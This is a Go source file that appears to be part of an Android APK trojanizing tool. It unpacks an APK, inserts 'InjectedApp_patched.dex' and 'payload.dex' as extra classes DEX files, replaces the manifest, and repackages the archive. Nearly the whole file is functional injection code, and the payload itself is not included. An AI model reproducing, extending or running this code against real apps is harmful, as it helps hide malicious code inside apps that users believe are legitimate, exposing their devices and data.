package common

import (
	"archive/zip"
	"compress/flate"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

var zipOutput, _ = filepath.Abs("sample_unzipped")
var injectedAppPrevName, _ = filepath.Abs("InjectedApp_patched.dex")
var payloadPrevName, _ = filepath.Abs("payload.dex")

func Inject(path string, zipModifiedOutput string) {

	if _, err := os.Stat(zipOutput); err == nil {
		err := os.RemoveAll(zipOutput)
		if err != nil {
			log.Panic(err)
		}
	}
	if _, err := os.Stat(zipModifiedOutput); err == nil {
		err := os.Remove(zipModifiedOutput)
		if err != nil {
			log.Panic(err)
		}
	}


	//unzip apk
	files, err := unzip(path, zipOutput)
	if err != nil {
		log.Panic("Failed to unzip APK",err)
		//log.Printf("Unzipped:\n" + strings.Join(files, "\n"))
	}

	//calc classes.dex index
	max := strings.Count(strings.Join(files, ""), "classes")
	log.Printf("max classes dex index = %d", max)
	max += 1

	// inject InjectedApp.dex
	var injectedAppNewName = "classes" + strconv.Itoa(max) + ".dex"


	copy(injectedAppPrevName, zipOutput + "\\" + injectedAppNewName)

	max +=1

	// inject payload.dex
	var payloadNewName = "classes" + strconv.Itoa(max) + ".dex"


	copy(payloadPrevName, zipOutput + "\\" + payloadNewName)

	log.Printf("Successfuly injected DEX:" + injectedAppNewName + "," + payloadNewName)

	//replace manifest
	copy(ManifestBinaryPath, zipOutput + "\\AndroidManifest.xml")

	files = append(files[0:], zipOutput + "\\" + injectedAppNewName)
	files = append(files[0:], zipOutput + "\\" + payloadNewName)

	// zip all files
	fmt.Println("\t--zipping...")
	ZipWriter(zipModifiedOutput)

	//delete sample_unzipped - we dont need it

	if _, err := os.Stat(zipOutput); err == nil {
		err := os.RemoveAll(zipOutput)
		if err != nil {
			log.Panic(err)
		}
	}
}


func ZipWriter(zipModifiedOutput string) {
	baseFolder,_ := filepath.Abs("sample_unzipped")

	// Get a Buffer to Write To
	outFile, err := os.Create(zipModifiedOutput)
	if err != nil {
		fmt.Println(err)
	}
	defer outFile.Close()

	// Create a new zip archive.
	w := zip.NewWriter(outFile)

	// Register a custom Deflate compressor.
	w.RegisterCompressor(zip.Deflate, func(out io.Writer) (io.WriteCloser, error) {
		return flate.NewWriter(out, flate.BestCompression)
	})

	// Add some files to the archive.
	addFiles(w, baseFolder, "")

	if err != nil {
		fmt.Println(err)
	}

	// Make sure to check the error on Close.
	err = w.Close()
	if err != nil {
		fmt.Println(err)
	}
}

func addFiles(w *zip.Writer, basePath, baseInZip string) {
	// Open the Directory
	files, err := ioutil.ReadDir(basePath)
	if err != nil {
		fmt.Println(err)
	}

	for _, file := range files {
		//fmt.Println(basePath + file.Name())
		if !file.IsDir() {
			dat, err := ioutil.ReadFile(basePath + "\\" + file.Name())
			if err != nil {
				fmt.Println(err)
			}

			// Add some files to the archive.
			f, err := w.Create(baseInZip + file.Name())
			if err != nil {
				fmt.Println(err)
			}
			_, err = f.Write(dat)
			if err != nil {
				fmt.Println(err)
			}
		} else if file.IsDir() {

			// Recurse
			newBase := basePath + "\\" + file.Name()
			//fmt.Println("Recursing and Adding SubDir: " + file.Name())
			//fmt.Println("Recursing and Adding SubDir: " + newBase)

			recPath := baseInZip  + file.Name() + "/"
			addFiles(w, newBase, recPath)
		}
	}
}



func copy(src, dst string){
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		log.Panic("Failed to inject DEX", err)
	}

	if !sourceFileStat.Mode().IsRegular() {
		log.Panic("Failed to inject DEX", err)
	}

	source, err := os.Open(src)
	if err != nil {
		log.Panic("Failed to inject DEX", err)
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		log.Panic("Failed to inject DEX", err)
	}
	defer destination.Close()
	_, err = io.Copy(destination, source)
	if err != nil {
		log.Panic("Failed to inject DEX", err)
	}
}

// Unzip will decompress a zip archive, moving all files and folders
// within the zip file (parameter 1) to an output directory (parameter 2).
func unzip(src string, dest string) ([]string, error) {

	var filenames []string

	r, err := zip.OpenReader(src)
	if err != nil {
		return filenames, err
	}
	defer r.Close()

	for _, f := range r.File {

		// Store filename/path for returning and using later on
		fpath := filepath.Join(dest, f.Name)

		// Check for ZipSlip. More Info: http://bit.ly/2MsjAWE
		if !strings.HasPrefix(fpath, filepath.Clean(dest)+string(os.PathSeparator)) {
			return filenames, fmt.Errorf("%s: illegal file path", fpath)
		}

		filenames = append(filenames, fpath)

		if f.FileInfo().IsDir() {
			// Make Folder
			os.MkdirAll(fpath, os.ModePerm)
			continue
		}

		// Make File
		if err = os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != nil {
			return filenames, err
		}

		outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if err != nil {
			return filenames, err
		}

		rc, err := f.Open()
		if err != nil {
			return filenames, err
		}

		_, err = io.Copy(outFile, rc)

		// Close the file without defer to close before next iteration of loop
		outFile.Close()
		rc.Close()

		if err != nil {
			return filenames, err
		}
	}
	return filenames, nil
}

